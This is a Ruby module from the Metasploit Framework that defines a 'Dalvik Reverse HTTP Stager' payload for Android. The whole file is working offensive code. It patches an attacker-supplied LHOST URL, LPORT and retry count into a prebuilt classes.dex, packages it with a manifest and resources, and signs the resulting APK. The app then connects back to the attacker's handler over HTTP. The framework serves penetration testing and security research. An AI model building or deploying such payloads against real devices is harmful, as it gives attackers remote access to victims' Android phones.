##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_http'

module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Dalvik

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Dalvik Reverse HTTP Stager',
      'Description'   => 'Tunnel communication over HTTP',
      'Author'        => 'anwarelmakrahy',
      'License'       => MSF_LICENSE,
      'Platform'      => 'android',
      'Arch'          => ARCH_DALVIK,
      'Handler'       => Msf::Handler::ReverseHttp,
      'Stager'        => {'Payload' => ""}
      ))

    register_options(
    [
      OptInt.new('RetryCount', [true, "Number of trials to be made if connection failed", 10])
    ], self.class)
  end 
  
  def generate_jar(opts={})
    u = datastore['LHOST'] ? datastore['LHOST'] : String.new
    raise ArgumentError, "LHOST can be 32 bytes long at the most" if u.length > 32
    
    jar = Rex::Zip::Jar.new

    classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})

    string_sub(classes, 'ZZZZ                                ', "ZZZZhttp://" + datastore['LHOST'].to_s) if datastore['LHOST']
    string_sub(classes, '4444                            ', datastore['LPORT'].to_s) if datastore['LPORT']
    string_sub(classes, 'TTTT                                ', "TTTT" + datastore['RetryCount'].to_s) if datastore['RetryCount']
    jar.add_file("classes.dex", fix_dex_header(classes))

    files = [
      [ "AndroidManifest.xml" ],
      [ "res", "drawable-mdpi", "icon.png" ],
      [ "res", "layout", "main.xml" ],
      [ "resources.arsc" ]
    ]

    jar.add_files(files, File.join(Msf::Config.install_root, "data", "android", "apk"))
    jar.build_manifest

    cert, key = generate_cert
    jar.sign(key, cert, [cert])

    jar
  end

end